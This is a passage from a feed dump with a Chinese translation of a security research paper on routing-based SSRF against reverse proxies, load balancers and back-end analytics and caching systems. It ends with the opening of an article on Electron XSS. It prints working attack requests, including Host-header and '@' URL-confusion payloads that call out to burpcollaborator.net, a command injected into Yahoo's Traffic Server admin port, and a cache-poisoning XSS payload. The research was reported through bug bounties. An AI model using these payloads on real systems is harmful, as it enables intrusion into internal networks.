&lt;/b&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;这个研究涉及到定位隐藏的系统，然而后台系统和负载均衡肯定不希望用户注意到它的存在。因此，我们不能依赖获得响应报文的内容来分析这些系统的漏洞。相反地，我们可以发送攻击负荷，然后再从 DNS 查询以及 HTTP 请求中分析。这篇论文的所有发现都是由回链功能引起的，漏洞和隐藏系统的发现都归功于它。我利用 Burp Collaborator 记录这些请求，不过你也可以利用你自己 DNS 服务器或者 Canarytokens（&lt;a href=&quot;https://canarytokens.org/&quot;&gt;Know.  Before it matters&lt;/a&gt;）来做到相同的效果。&lt;/p&gt;&lt;p&gt;我一开始用 Burp 简单的 匹配/替换 规则来注入硬编码回链（pingback）攻击负荷（payload）到我的网络流量中。这个方法明显失败了，这些负荷引起了过多网站的回链，导致了我难以关联每个回链到其对应的网站。后来我也了解了一些载荷会导致回链延迟——短的三分钟，长的数小时，有些甚至长达1天。&lt;/p&gt;&lt;p&gt;为了高效地分类回链，我写了 Collaborator Everywhere，一个能够注入有独特标识的载荷的Burp扩展，并且用户能够自动关联回链到与其对应的主机。打个比方，下面的截图展示了在我们访问 Netflix 四小时之后，Collaborator Everywhere 认出它们已经访问过我们在Referer 头中指定的URL，并且在访问时伪装成运行在 x86 平台的 iPhone。&lt;/p&gt;&lt;b&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-494f2384db9173602f14855b7784f370.png_r.jpg&quot; data-rawwidth=&quot;1214&quot; data-rawheight=&quot;551&quot;&gt;&lt;/b&gt;&lt;p&gt;&lt;b&gt;2 .扩大范围&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Collaborator Everything 对于单一目标的人工审计十分高效，论文中半数的漏洞都是用它发现的。然而，在这个研究中，我注意到雅虎服务器的某个漏洞无论扫描多少次，每次扫描只有百分之三十的成功几率。这个问题的核心原因是雅虎使用了 DNS 轮询来负载均衡三个前台服务器的入站请求，而这三个服务器只有一个有那个漏洞。这种奇怪的问题对安全审计影响很小，然而它能产生破坏负载均衡的漏洞。为了确保所监测到有具有漏洞的服务器，系统地验证并把攻击载荷发送到目标网络设施是十分重要的步骤。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-fefa43d31a3b0189221e3b87d37e635b.png_r.jpg&quot; data-rawwidth=&quot;1000&quot; data-rawheight=&quot;440&quot;&gt;&lt;p&gt;我一开始使用 Burp Collaborator 和修改过的 Masscan，后来由于追求 HTTP/1.1和 HTTPS 的支持，就用 Zmap/ZGrab 来代替 Masscan。为了关联回链到对应的主机，我在攻击载荷前加了目标的主机名，比如在 &lt;a href=&quot;http://example.com/&quot;&gt;example.com&lt;/a&gt; &lt;a href=&quot;http://xn--example-4t3kgm23f0k728by93f1xfem5aifvs19e.com.collaboratorid.burpcollaborator.net/&quot;&gt;的漏洞会发送一个类似example.com.collaboratorid.burpcollaborator.net&lt;/a&gt; 的 DNS 查询。攻击目标的域名和 IP 地址是从合法的漏洞奖励计划筛选的。我利用这个技术鉴定成千上万的IP地址了，并且分析出大概有五万个在监听 80/443 端口。之后再用 DNS 反查技术，发现相当一部分的伪装成谷歌的网络设施，也许它们不太愿意受到安全审计吧。&lt;/p&gt;&lt;p&gt;如果发送的数据包不能命中服务器要害的话，效果甚微。为了最大化覆盖面，我对每个IP至多用了五个主机名来测试，并且都包含 HTTP 和 HTTPS。同样地，我也试着用 &lt;b&gt;&lt;i&gt;X-Forwarded-Proto: HTTPS &lt;/i&gt;&lt;/b&gt;和 &lt;b&gt;&lt;i&gt;and orwards &lt;/i&gt;&lt;/b&gt;触发边缘案例。&lt;b&gt;&lt;i&gt;Cache-Control: no-transform &lt;/i&gt;&lt;/b&gt;头被我用来防止中间服务器篡改负荷。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;伪造请求&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;反向代理被用来把请求转发给内部服务器。它们通常在网络中有特权，比如接收外网信息并将其转发给 DMZ 内的服务器。通过合适的载荷.一些反向代理会被攻击者操控，去访问指定的地址。这会使他们成为 SSRF 的一种强大变体。这副图简单的描述了该种攻击：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-24f1cd053c5890e0e7756dcdde0a8a2e.png_r.jpg&quot; data-rawwidth=&quot;694&quot; data-rawheight=&quot;427&quot;&gt;&lt;p&gt;注意，这类攻击总是利用伪造的请求，并影响一些工具的使用（&lt;u&gt;&lt;a href=&quot;https://github.com/zaproxy/zaproxy/issues/1318&quot;&gt;https://github.com/zaproxy/zaproxy/issues/1318&lt;/a&gt;&lt;/u&gt;），而且在实验过程中你有可能攻击自己公司的或者 ISP 的网关。我会推荐 Burp Suite，mitmproxy，和 Ncat/OpenSSL 当作你的工具。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;无效主机&lt;/b&gt;&lt;/p&gt;&lt;p&gt;最简单的触发回调（callback）的方法是发送错误的 HTTP 主机头：&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;---
GET / HTTP/1.1
Host: uniqid.burpcollaborator.net
Connection: close
---&lt;/code&gt;&lt;p&gt;虽然在某些圈子里已经家喻户晓了，这项技术依然不算流行。我利用它成功攻破了27个 DoD服务器，自己的 ISP，以及一个哥伦比亚 ISP，和 &lt;u&gt;&lt;a href=&quot;http://ats-vm.lorax.bf1.yahoo.com/&quot;&gt;http://ats-vm.lorax.bf1.yahoo.com/&lt;/a&gt;&lt;/u&gt;。为了表明问题的严重性，我们先拿 &lt;u&gt;&lt;a href=&quot;http://ats-vm.lorax.bf1.yahoo.com/&quot;&gt;http://ats-vm.lorax.bf1.yahoo.com/&lt;/a&gt;&lt;/u&gt;开刀。&lt;/p&gt;&lt;p&gt;首先，我们来看看上面运行的软件：&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;---
GET / HTTP/1.1
Host: XX.X.XXX.XX:8082


HTTP/1.1 200 Connection Established
Date: Tue, 07 Feb 2017 16:32:50 GMT
Transfer-Encoding: chunked
Connection: close

Ok
/ HTTP/1.1 is unavailable
Ok
Unknown Command
Ok
Unknown Command
Ok
Unknown Command
Ok
---&lt;/code&gt;&lt;p&gt;不到一分钟，我就通过 &lt;i&gt;HELP &lt;/i&gt;命令知道服务器确切运行的软件：&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;---
HELP / HTTP/1.1
Host: XX.X.XXX.XX:8082


HTTP/1.1 200 Connection Established
Date: Tue, 07 Feb 2017 16:33:59 GMT
Transfer-Encoding: chunked
Connection: keep-alive

Ok

  Traffic Server Overseer Port

  commands:
    get &amp;lt;variable-list&amp;gt;
    set &amp;lt;variable-name&amp;gt; = &quot;&amp;lt;value&amp;gt;&quot;
    help
    exit

  example:

    Ok
    get proxy.node.cache.contents.bytes_free
    proxy.node.cache.contents.bytes_free = &quot;56616048&quot;
    Ok

  Variable lists are conf/yts/stats records, separated by commas

Ok
Unknown Command
Ok
Unknown Command
Ok
Unknown Command
Ok
---&lt;/code&gt;&lt;p&gt;数行 &#39;&lt;b&gt;&lt;i&gt;Unknown Command&lt;/i&gt;&lt;/b&gt;&#39; 意味着服务器将每行文字当作一个单独的命令。这种一行一个命令的协议对于传统的 SSRF 来讲几乎不可能利用。幸运的是，以路由为基础的 SSRF 灵活性更强，并且我能在发送 GET 请求的同时附带包含着命令的 POST 参数：&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;---
GET / HTTP/1.1
Host: XX.X.XXX.XX:8082
Content-Length: 34

GET proxy.config.alarm_email


HTTP/1.1 200 Connection Established
Date: Tue, 07 Feb 2017 16:57:02 GMT
Transfer-Encoding: chunked
Connection: keep-alive

Ok
/ HTTP/1.1 is unavailable
Ok
Unknown Command
Ok
proxy.config.alarm_email = &quot;nobody@yahoo-inc.com&quot;
---&lt;/code&gt;&lt;p&gt;通过 SET 命令，我能够对雅虎的负载均衡集群做许多的配置，比如开启 SOCKS 代理，授予我的IP直接推送文件到服务器缓存的权限。我递交报告给雅虎并接受到了一万五千美元的奖励。几周后 ZGrab 发现了另一个有着类似问题的服务器，这又让我拿到了5000美元。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;探索 British Telegram&lt;/b&gt;&lt;/p&gt;&lt;p&gt;在我尝试用非法主机名 fuzz 时，我注意到了一个收到 ip 与公司不对应的回链，其中包括了 cloud.mail.ru 。我一开始认为这些公司用了 WAF 做保护，但是我又发现我可以发送请求到内网管理接口。看来并不是风平浪静啊。反查这个IP的域名，发现它来自 bn-proxyXX.ealing.ukcore.bt.net——BT 是一家英国通讯公司，也是我所在的公司的 ISP 供给商。从英国肯特得到一个被发去俄罗斯的回链是一个十分怪异的现象。我开始用 Burp Suite 来追踪，发现响应只花了五十毫秒，对于从英国到俄罗斯这么长的距离，五十毫秒的通信短的令人怀疑。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b4a5c605f515014563075d679300c82c.png_r.jpg&quot; data-rawwidth=&quot;1600&quot; data-rawheight=&quot;664&quot;&gt;&lt;p&gt;我推测到 &lt;a href=&quot;http://cloud.email.ru/&quot;&gt;cloud.email.ru&lt;/a&gt; 的 TCP 连接被我的 ISP 所终结。因为在 TCP 端口443（HTTPS）上传递的信息并没有被篡改，这意味着篡改我们流量的东西并没有 &lt;a href=&quot;http://mail.ru/&quot;&gt;mail.ru&lt;/a&gt; 的证书，也就是说这个劫持是在未经 &lt;a href=&quot;http://email.ru/&quot;&gt;email.ru&lt;/a&gt; 同意的情况下进行的。无论在家还是公司，这一行为都可以被复现，有没有可能是 GNCQ 在监视我呢？当我发现我的朋友也会被类似劫持，我否认了之前的想法，然而这个神秘的设备究竟是什么呢？&lt;/p&gt;&lt;p&gt;为了去分析这个系统的真正目的，我使用TTL设置为10的 Masscan 去扫描所有 IPv4 公网上开放着 80 端口的主机。当排除了托管主机后，我有了一份目标 IP 的名单。在我对这份名单采样之后，我发现这个系统的初衷是拦截受版权保护的内容。在黑名单中的 IP 会被转发到一个端口来检查 HTTP 主机头，然后阻止这样的请求：&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;---
GET / HTTP/1.1
Host: www.icefilms.info

HTTP/1.1 200 OK
...
&amp;lt;p&amp;gt;Access to the websites listed on this page has been blocked pursuant to orders of the high court.&amp;lt;/p&amp;gt;
---&lt;/code&gt;&lt;p&gt;事实上，绕过这一限制甚至不需要改动主机头。不过我把它留给读者当思考题。&lt;/p&gt;&lt;p&gt;这一配置会有几个严重的后果。多亏了像 Google Site 这样的虚拟主机，云主机，我的流量才会被这种黑名单所劫持。不过这也意味着所有访问这些站点来的流量都要被 BT 公司处理一遍。从黑名单服务器的角度来看，所有的 BT 都共用一份黑名单地址，这会导致 ISP 对其的滥用并使用户不能访问许多网站。同样地，如果我能用前面介绍的漏洞去控制管理员面板，那么就可能向成千上万的 BT 用户注入危险内容。最后，我想说明一下这种问题已经被忽视了很久。这几年来，我和英国其他的渗透测试人员在渗透时都多多少少经过这种端口，却还是忽略了它的存在。&lt;/p&gt;&lt;p&gt;我汇报了这类问题给一个我认识的 BT 同事，他们很快就解决了。他们表示这个系统是CleanFeed 的一部分，一开始是用来阻拦儿童不宜的图片，后来，它又加入了版权保护的功能。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;探索 METROTEL&lt;/b&gt;&lt;/p&gt;&lt;p&gt;后来我在一个叫 METROTEL 的哥伦比亚 ISP 发现了异样行为。Rapid7 的 Project Sonar 就用了被它投毒的 DNS 服务器。为了在传递 HTTPS 流量时不产生证书错误，他们从服务器名称指示中嗅探目标主机。我通知了 Rapid7 关于异常 DNS 服务器的事情，并用 Alexa top 1 million domain 列表找到被投毒目标。目标站点似乎是视频，图片网站，以及小众化的社交网站。然而我访问它们时都被重定向到 &lt;u&gt;&lt;a href=&quot;http://internetsano.metrotel.net.co/&quot;&gt;http://internetsano.metrotel.net.co/&lt;/a&gt;&lt;/u&gt;， 并声称这个网站因为有儿童不宜的内容而被阻拦访问。&lt;/p&gt;&lt;p&gt;和 BT 一样，这个系统的初衷也许是好的，但是这个网站却没有被重新设计的痕迹。除了图像网站，这个网站也对 bbc.co.ue 这样的新闻网站进行投毒。虽然我还没验证，但是该网站可能会对包含某些敏感信息的新闻进行阻拦。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;处理输入排序&lt;/b&gt;&lt;/p&gt;&lt;p&gt;星星之火，可以燎原。我们先来看看我收到的几个请求：&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;---
GET / HTTP/1.1
Host: burpcollaborator.net
Connection: close
---&lt;/code&gt;&lt;p&gt;他们多次触发了一个到 outage.&amp;lt; 被指定的域名&amp;gt;的请求：&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;---
GET /burpcollaborator.net/burpcollaborator.net HTTP/1.1
Host: outage.burpcollaborator.net
Via: o2-b.ycpi.tp2.yahoo.net
---&lt;/code&gt;&lt;p&gt;这种行为几乎不可预计，所以最好的处理是对 DNS，SSL 进行范解析。因为内部服务器并不会在路径中包含敏感数据，这种怪异的行为看似没有攻击点。幸运的是，如果你注册了outage.&amp;lt; 被指定的域名&amp;gt;并且把它解析为内网地址，那就可以发送到内部服务器的 Web 根目录的请求。&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;---
GET / HTTP/1.1
Host: ../?x=.vcap.me
Connection: close
---&lt;/code&gt;&lt;p&gt;这将导致如下请求：&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;---
GET /vcap.me/../?=x=.vcap.me
Host: outage.vcap.me
Via: o2-b.ycpi.tp2.yahoo.net
---&lt;/code&gt;&lt;p&gt;请求被解析完之后，URL 会变成  &lt;u&gt;&lt;a href=&quot;https://outage.vcap.me/?x=whatever&quot;&gt;https://outage.vcap.me/?x=whatever&lt;/a&gt;&lt;/u&gt; &lt;a href=&quot;http://vcap.me/&quot;&gt;vcap.me&lt;/a&gt; 是一个可以把所有对其子域名的请求解析成 127.0.0.1，因此我们相当于收到从 &lt;u&gt;&lt;a href=&quot;https://127.0.0.1/&quot;&gt;https://127.0.0.1&lt;/a&gt;&lt;/u&gt;的数据。这个漏洞让我从雅虎收到5000美元的奖励。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;主机重写&lt;/b&gt;&lt;/p&gt;&lt;p&gt;我之前用来创建恶意重置密码邮件（&lt;u&gt;&lt;a href=&quot;http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html&quot;&gt;http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html&lt;/a&gt;&lt;/u&gt;） 的方法对国防部的部分主机也有效。有些服务器会对主机头做白名单检查，但是却没想到解析时，在指定 HOST 时，它会被优先解析。&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;---
GET http://internal-website.mil/ HTTP/1.1
Host: xxxxxxx.mil
Connection: close
---&lt;/code&gt;&lt;p&gt;利用这个特性，我可以访问许多内部服务器，其中包括了一个有漏洞的网上图书馆和一个文件传输服务器。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;模糊请求&lt;/b&gt;&lt;/p&gt;&lt;p&gt;一些主机被 Incapsula 的 WAF 所保护。Incapsula 通过判断主机头来决定消息转发的目标，所以前面的的攻击不起作用。但是，Incapsula 通过截断端口来解析出主机，意外着以下的请求会被发送到 incapsula-client.net：&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;---
GET / HTTP/1.1
Host: incapsula-client.net:80@burp-collaborator.net
Connection: close
---&lt;/code&gt;&lt;p&gt;然而，收到 &lt;a href=&quot;http://incapsula.net/&quot;&gt;incapsula.net&lt;/a&gt; 消息转发的服务器会把 incapsula-client 以及 :80 当作用户名和密码来访问 burp-collaborator.net。除了暴露攻击面以外，这也会泄露服务器的真实 ip，让我们能绕过 Incapsula 的 WAF 保护。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;打破常规&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Broken request routing 漏洞并不总是由错误配置引起的。举个例子，以下在 New Relic 服务器的代码引起了高危漏洞：&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;---
Url backendURL = &quot;http://public-backend/&quot;;
String uri = ctx.getRequest().getRawUri();

URI proxyUri;
try {
proxyUri = new URIBuilder(uri)
        .setHost(backendURL.getHost())
        .setPort(backendURL.getPort())
        .setScheme(backendURL.getScheme())
        .build();
} catch (URISyntaxException e) {
    Util.sendError(ctx, 400, INVALID_REQUEST_URL);
    return;
}
---&lt;/code&gt;&lt;p&gt;这个代码看上去没什么问题——它用硬编码后的后端服务器地址替换用户提供的 URL，然而Apache HttpComponents server 库需要一个从 &#39;/&#39; 开始的路径才能正常运作，如下请求：&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;---
GET @burp-collaborator.net/ HTTP/1.1
Host: newrelic.com
Connection: close
---&lt;/code&gt;&lt;p&gt;会被重写为 &lt;u&gt;&lt;a href=&quot;http://public-backend@burp-collaborator.net/&quot;&gt;http://public-backend@burp-collaborator.net&lt;/a&gt;&lt;/u&gt; 并且发送请求到 burp-collaborator.net。这个漏洞也给我访问内网的权限。&lt;/p&gt;&lt;p&gt;不幸的是 New Relic 不肯给我奖励，但他们很快修复了这个漏洞。我也向 Apache 基金会汇报了这个问题。除了在 New Relic，我还在雅虎的17个服务器中发现了类似问题，并且赚了8000美刀。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;隧道&lt;/b&gt;&lt;/p&gt;&lt;p&gt;用@来误导 URL 解析十分奏效。然而并不是所有的系统支持这种形式的 URL，因此我尝试了一下变体：&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;---
GET xyz.burpcollaborator.net:80/bar HTTP/1.1
Host: demo.globaleaks.org
Connection: close
---&lt;/code&gt;&lt;p&gt;这可能会让主机去访问公开服务器 xyz.burpcollaborator.net ，然后我们的 DNS 服务器可以收到请求。然而我的 DNS 却收到来自不同地址的查询：&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;---
xYZ.BurpcoLLABoRaTOR.neT.    from 89.234.157.254
Xyz.burPColLABorAToR.nET.    from 62.210.18.16 
xYz.burpColLaBorATOR.net.    from 91.224.149.254
---&lt;/code&gt;&lt;p&gt;GlobalLeak 利用 Tor2Web 来将入站请求发送到一个 Tor 匿名服务来隐藏其真是地址。Tor 退出节点时用了模糊化机制来加强DNS的安全性，这个机制导致 Burp Collaborator 拒绝回复消息并出发大规模的查询请求。&lt;/p&gt;&lt;p&gt;这个漏洞有一个问题——当所有的请求被导向 Tor 时，我们不能任意访问内网服务。即便如此，我们还是可以利用它当跳板攻击其它服务器。除此之外，让网站通过 Tor 访问恶意站点也会暴露许多攻击面。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;攻击辅助系统&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们已经探索了许多反向端口和误导它们发送请求的技术，但到目前为止影响都十分相似。在这个章节我们会攻击后台分析系统和缓存系统，通常，找到一个这类系统的高危漏洞比前面介绍的回调要难很多。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;信息收集&lt;/b&gt;&lt;/p&gt;&lt;p&gt;基于路由的攻击通常不会影响网站的正常运作，然而 Collaborator Everywhere 在每个请求注入许多不同的攻击：&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;---
GET / HTTP/1.1
Host: store.starbucks.ca
X-Forwarded-For: a.burpcollaborator.net
True-Client-IP: b.burpcollaborator.net
Referer: http://c.burpcollaborator.net/
X-WAP-Profile: http://d.burpcollaborator.net/wap.xml
Connection: close
---&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;X-Forwarded-For&lt;/b&gt;&lt;/p&gt;&lt;p&gt;X-Forwarded-For 和 True-Client-IP 头是易于触发而难于利用的攻击，它们通常用来伪造 IP 地址或者主机名。信任这些头部的服务器通常会执行 DNS 查询来将主机名解析成 IP。这意味着它们会被 IP 伪造攻击所影响，除非你能用 DNS 破坏内存，它的回调本身不能被利用。&lt;/p&gt;&lt;p&gt;&lt;b&gt;Referer&lt;/b&gt;&lt;/p&gt;&lt;p&gt;类似的，Web 分析系统会抓取 Referer 头中的 URL。有些为了 SEO，甚至爬去整个 referer URL 中的内容。这个行为十分有用，因此我们应该关闭 robot.txt 的限制。很明显，由于我们无法得知分析系统收到的内容，这是一个 blind SSRF 漏洞。这个行为一般需要一段时间才会触发，因此我们更加难以利用它了。&lt;/p&gt;&lt;p&gt;&lt;b&gt;参数重复&lt;/b&gt;&lt;/p&gt;&lt;p&gt;出于种种原因，Incapsula 会多次获取参数。然而他们并没有漏洞奖励计划，因此我也不能去探索它是否可以被利用。&lt;/p&gt;&lt;p&gt;&lt;b&gt;X-Wap-Profile&lt;/b&gt;&lt;/p&gt;&lt;p&gt;这是一个非常老的 HTTP 头了，这是用来放置一个描述兼容性，比如设备大小，是否支持蓝牙等信息的 XML 地址，比如：&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;---
GET / HTTP/1.1
Host: facebook.com
X-Wap-Profile: http://nds1.nds.nokia.com/uaprof/N6230r200.xml
Connection: close
---&lt;/code&gt;&lt;p&gt;这会将 X-Wap-Profile 中的 XML 提取出来，然后再解析里面的内容。如果没有配置好的话，还是可以被利用的。可惜的是支持这个头的网站不多，而 Facebook 是唯一一个在提供漏洞奖励的网站中支持它的。Facebook 每26小时才解析一次这种 XML，因此利用它来攻击不大实际。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;攻击远程客户端&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在这些情况下，直接的 SSRF 攻击不能让我们接收到从应用返回的内容。我的第一个想法是利用 RCE 来盲打内网。然而这个技术并不能吸引我，所以我选择专注与回链的客户端。和反向代理一样，这些客户端的安全性不高。我能在其建立 HTTPS 链接时利用 heartbleed 漏洞来获得内存信息。它们所使用 PhantomJS 这样的 Headless Browser 通常也是没有打补丁的旧版本。基于 Windows 的客户端可能会自动将域凭据记载到由 SpiderLab 提供的 Responder 服务器, lcamtuf的p0f 也可以在 UA 被伪造的情况下挖掘实际客户端。&lt;/p&gt;&lt;p&gt;虽然有些 应用会无视输入的 URL，但也有许多库会处理它们并展示出奇怪的现象。比如Tumblr 的 URL 预览功能只设计时支持HTTP，不过它也可以重定向你到 ftp 服务。Orange Tsai指出并分析了许多类似的议题。&lt;/p&gt;&lt;p&gt;一些客户端不下载完整页面——他们只是简单地渲染并选择一些 JavaScript 执行。手工挖掘这些客户端潜在的漏洞几乎不可能，因此我的同事 Gareth Heyes 开发出了一个叫 &#39;Rendering Engine Hackability Probe&#39;  的软件来探测 JavaScript 特殊原型及常见的漏洞，比如无视SOP。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0387f47c0cee00e3ee0679aa64cc7219.png_r.jpg&quot; data-rawwidth=&quot;1535&quot; data-rawheight=&quot;1176&quot;&gt;&lt;p&gt;我们可以看到，它发现了罕见的 JavaScript 原型——&#39;parity&#39; 和 &#39;System&#39;。这些特别的原型可能没用，也有可能帮大忙。&#39;party&#39; 可以用来拿用户钱包里的公匙并公开余额。JXBrowser 可以让开发者添加一段 Javascript/Java 桥接。而且在去年，我们发现了使其任意代码执行的方法。错误配置并启用 JavaScript 的客户端也可以通过 &lt;u&gt;&lt;a href=&quot;file:///URLs&quot;&gt;file:///URLs&lt;/a&gt;&lt;/u&gt; 访问。这会使本地文件或变量被 XSS 读取。同样地，我们也可以用它来进行 blind SSRF。我们在不执行 JS 的客户端进行了基本的测试。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;预缓存&lt;/b&gt;&lt;/p&gt;&lt;p&gt;在寻找漏洞时，我注意到一个军队相关的服务器的奇怪行为。发送以下请求时：&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;---
GET / HTTP/1.1
Host: burpcollaborator.net
---&lt;/code&gt;&lt;p&gt;一开始它返回正常的请求。不过我后面又收到了如下请求：&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;---
GET /jquery.js HTTP/1.1
GET /abrams.jpg HTTP/1.1
---&lt;/code&gt;&lt;p&gt;有东西在对我发出去的请求进行解析并打算从中获取资源。当我看到 &lt;b&gt;&lt;i&gt; &amp;lt;img src=/abrams.jpg /&amp;gt; &lt;/i&gt;&lt;/b&gt;时，我意识到了它会使用我给的 host 头部来完善绝对地址并抓取文件。我通过它的反向代理确认了这一点。这样的话，我就可以通过注入假的 JPG 地址来进行反射形 XSS。&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;---
POST /xss.cgi HTTP/1.1
Content-Length: 103
Connection: close

xss=&amp;lt;img src=&quot;http://internal-server.mil/index.php/fake.jpg&quot;/&amp;gt;
---&lt;/code&gt;&lt;p&gt;反向代理会这样抓取并保存信息到缓存中：&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;---
GET /index.php/fake.jpg
Host: internal-server.mil
Connection: close
---&lt;/code&gt;&lt;p&gt;以下是攻击的流程图：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-8a18dd122d7b4f75d1ddabfb7c33859c.png_r.jpg&quot; data-rawwidth=&quot;1600&quot; data-rawheight=&quot;752&quot;&gt;&lt;p&gt;注意在 URL 为绝对路径的情况下，就算注入一个完全不存在的主机头，在这里的 XSS 也依旧可以工作。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;总结:&lt;/b&gt;&lt;/p&gt;&lt;p&gt;近几年的漏洞奖励计划鼓励了更多研究；我们同时也可以在短短时间内收集大规模的主机信息。利用它们，我展示了攻击反向代理的一些手段，并且赚到了三万三千美金。为了更好的防护，反向代理应该也被放置到DMZ中，并阻挡对内部网络的访问。&lt;/p&gt;&lt;p&gt;同时我也展示了如何获后台系统的操作权限。虽然比前台系统更难，但是它们暴露了更深一层的攻击面。最后，我添加探测路由漏洞的功能到Burp Suite，并公开了该项目来帮助更多的研究人员。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;参考：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://portswigger.net/knowledgebase/papers/CrackingTheLens-whitepaper.pdf&quot;&gt;https://portswigger.net/knowledgebase/papers/CrackingTheLens-whitepaper.pdf&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
<author>TwoSecurity</author>
<guid isPermaLink="false">2017-08-04-28306016</guid>
<pubDate>Sun, 01 Jan 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>Electron  hack —— 跨平台 XSS</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2017-07-29-28186225.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Electron  hack —— 跨平台 XSS&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28186225&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;基于 Electron 的 XSS 攻击实例，远比你想象的简单。&lt;/p&gt;&lt;h2&gt;什么是 Electron&lt;/h2&gt;&lt;p&gt;也许你从未听说过跨平台 XSS，也从未听说过 Electron， 但你肯定知道 GitHub，或者使用过著名的 Atom 编辑器， 比如正在尝试翻译这篇文章的笔者，正在使用 Atom 来编写 Markdown。 Electron 优秀的跨平台特性，是本文的基础。&lt;br&gt;&lt;br&gt;简单来说，Electron 是一个框架，用于方便开发者创建跨平台应用。 开发者可以通过它来使用 HTML + JavaScript 来开发桌面应用。 Electron 的用户非常广泛，因为它确实可以为不同平台提供同样的体验。&lt;/p&gt;&lt;p&gt;与传统观念的所谓“桌面应用”不同， Electron 应用包括两个部分（Node.js 和 Chromium）作为运行环境。 分别支持一个主进程和一个渲染进程， 其中，主进程是一个非常 Node.js 风格的进程， 而渲染进程是一个可以运行 Node.js 代码的 Chromium 内核浏览器。&lt;br&gt;&lt;/p&gt;&lt;p&gt;由上文我们得知，Electron 应用是非常特殊的， 它本身是一个二进制应用，而渲染进程则是一个浏览器， 而 Electron 自身又具有很多的特性，所以，我们将从三个方面分析。&lt;/p&gt;&lt;p&gt;我们已知 Electron 的渲染进程是由 Chromium + Node.js 构成， 那么我们可以从分析传统 Web 应用的角度，得出这样的结论：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;DOM 操作非常多、非常频繁&lt;/li&gt;&lt;li&gt;基于 DOM 的 XSS 会变得很容易发生&lt;/li&gt;&lt;li&gt;可以完成基于 JavaScript 的自由重定向（重定向至不可信站点）&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;所以，使用传统的 Web 应用分析套路来处理 Electron 是十分必要的。&lt;br&gt;&lt;/p&gt;&lt;h2&gt;什么是 DOM-Based XSS&lt;/h2&gt;&lt;p&gt;众所周知，DOM-Based XSS 的频发主要是因为 DOM 相关处理不当。 DOM-Based XSS 是因未经转义的用户输入被直接生成为 HTML 而产生。 一般而言，随着 DOM 操作的增多，DOM-Based XSS 